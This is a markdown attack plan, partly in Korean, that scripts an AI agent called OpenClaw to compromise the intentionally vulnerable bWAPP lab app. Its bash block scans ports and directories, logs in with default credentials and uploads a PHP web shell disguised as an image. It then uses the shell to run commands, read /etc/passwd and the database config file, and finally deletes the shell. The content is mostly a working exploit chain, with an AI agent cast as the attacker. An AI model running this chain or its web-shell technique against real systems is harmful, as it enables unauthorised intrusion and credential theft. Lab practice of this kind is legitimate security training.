# AI Agent Attack Scenario - bWAPP (bee-box)

## Environment Overview

| Item         | Value                          |
|--------------|-------------------------------|
| Target URL   | http://172.17.96.1:8002        |
| Domain       | clientc.local                  |
| App          | bWAPP (bee-box)                |
| Attacker     | Kali Linux (VMM)               |
| LLM Backend  | LM Studio (Windows Host)       |
| Agent        | OpenClaw (Kali Internal)       |
| PHP Payload  | /tmp/*.php                     |

---

## Phase 0 - Pre-Flight Check

**목적**: 에이전트 시작 전 환경 및 연결 상태 검증

- [ ] LM Studio API 응답 확인 (Windows Host)
- [ ] OpenClaw 에이전트 연결 상태 확인
- [ ] 네트워크 연결 확인 (ping 172.17.96.1)
- [ ] /tmp PHP 파일 존재 확인
- [ ] /etc/hosts에 clientc.local 등록 확인

```bash
# hosts 등록 확인
grep "clientc.local" /etc/hosts || echo "172.17.96.1 clientc.local" >> /etc/hosts
nmap -sV -p 8002 172.17.96.1
gobuster dir -u http://clientc.local:8002 \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,html,txt
curl -s -o /dev/null -w "%{http_code}" \
  http://clientc.local:8002/login.php
curl -s -c /tmp/bwapp_session.txt \
  -d "login=bee&password=bug&security_level=0&form=submit" \
  http://clientc.local:8002/login.php
curl -s -b /tmp/bwapp_session.txt \
  http://clientc.local:8002/portal.php | grep -o "Welcome.*bee"
ls -la /tmp/*.php
curl -s -b /tmp/bwapp_session.txt \
  "http://clientc.local:8002/unrestricted_file_upload.php"
curl -s -b /tmp/bwapp_session.txt \
  -F "file=@/tmp/shell.php;type=image/jpeg" \
  -F "MAX_FILE_SIZE=100000" \
  -F "form=upload" \
  http://clientc.local:8002/unrestricted_file_upload.php
curl -s -b /tmp/bwapp_session.txt \
  "http://clientc.local:8002/images/shell.php?cmd=id"
curl -s -b /tmp/bwapp_session.txt \
  "http://clientc.local:8002/images/shell.php?cmd=uname+-a"

curl -s -b /tmp/bwapp_session.txt \
  "http://clientc.local:8002/images/shell.php?cmd=cat+/etc/passwd"
curl -s -b /tmp/bwapp_session.txt \
  "http://clientc.local:8002/images/shell.php?cmd=ifconfig"
curl -s -b /tmp/bwapp_session.txt \
  "http://clientc.local:8002/images/shell.php?cmd=cat+/var/www/bWAPP/db.php"
curl -s -b /tmp/bwapp_session.txt \
  "http://clientc.local:8002/images/shell.php?cmd=rm+-f+/var/www/bWAPP/images/shell.php"
rm -f /tmp/bwapp_session.txt
echo "[$(date)] Scenario completed." >> /tmp/agent_report.log
```
